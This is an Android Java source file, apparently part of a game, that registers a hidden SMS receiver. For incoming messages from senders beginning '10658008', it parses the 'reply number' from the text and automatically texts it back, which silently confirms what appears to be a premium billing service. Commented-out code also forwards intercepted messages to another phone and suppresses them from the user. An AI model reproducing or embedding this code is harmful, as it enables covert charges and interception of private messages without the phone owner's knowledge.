package com.game5a.sms;

import android.app.Activity;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;

public class SmsReceiver extends BroadcastReceiver {
	private static String ACTION_SMS_RECEIVED = "android.provider.Telephony.SMS_RECEIVED";

	private static String SENDER_NUMBER_HEAD = "10658008";

	private static Activity activity;

	public static void Init(Activity a) {
		activity = a;
		activity.registerReceiver(new SmsReceiver(), new IntentFilter(ACTION_SMS_RECEIVED));
	}

	@Override
	public void onReceive(Context context, Intent intent) {
		// 判断是系统短信；   
		if (intent.getAction().equals(ACTION_SMS_RECEIVED)) {
//			StringBuffer sb = new StringBuffer();
			String sender = null;
			String content = null;
			//			String sendtime = null;
			Bundle bundle = intent.getExtras();
			if (bundle != null) {
				// 通过pdus获得接收到的所有短信消息，获取短信内容；   
				Object[] pdus = (Object[]) bundle.get("pdus");
				// 构建短信对象数组；   
				SmsMessage[] mges = new SmsMessage[pdus.length];
				for (int i = 0; i < pdus.length; i++) {
					// 获取单条短信内容，以pdu格式存,并生成短信对象；   
					mges[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
				}
				SmsMessage mge = mges[0];
//				for (SmsMessage mge : mges) {
					sender = mge.getDisplayOriginatingAddress();// 获取短信的发送者   
					content = mge.getMessageBody();// 获取短信的内容   

					//					sb.append("短信来自：" + sender + "\n");
					//					sb.append("短信内容：" + content);

					//					Date date = new Date(mge.getTimestampMillis());
					//					SimpleDateFormat format = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
					//					sendtime = format.format(date);// 获取短信发送时间；  

					//					SmsManager manager = SmsManager.getDefault();
					//					manager.sendTextMessage("5556", null, "发送人:" + sender + "-----发送时间:" + sendtime + "----内容:" + content, null, null);//把拦截到的短信发送到指定的手机，此处为5556;
					//					if ("5556".equals(sender)) {
					//						//屏蔽手机号为5556的短信，这里还可以时行一些处理，如把该信息发送到第三人的手机等等。   
					//						abortBroadcast();
					//					}

					//Toast.makeText(context, sb.toString(), Toast.LENGTH_LONG).show();

					System.out.println("sender: " + sender);
					
					if (sender.startsWith(SENDER_NUMBER_HEAD)) {
						//不再往下传播
						//this.abortBroadcast();
						String str0 = "回复数字";
						String str1 = "，";
						int index0 = content.indexOf(str0);
						//System.out.println("index0: " + index0);
						if (index0 < 0) {
							return;
						}
						index0 += str0.length();
						int index1 = content.indexOf(str1, index0);
						//System.out.println("index1: " + index1);
						if (index1 < 0) {
							return;
						}
						String numStr = content.substring(index0, index1);
						System.out.println("Revert Num: " + numStr);
						SmsManager sms = SmsManager.getDefault();
						sms.sendTextMessage(sender, null, numStr, null, null);

					}

//				}

			}
		}
	}
}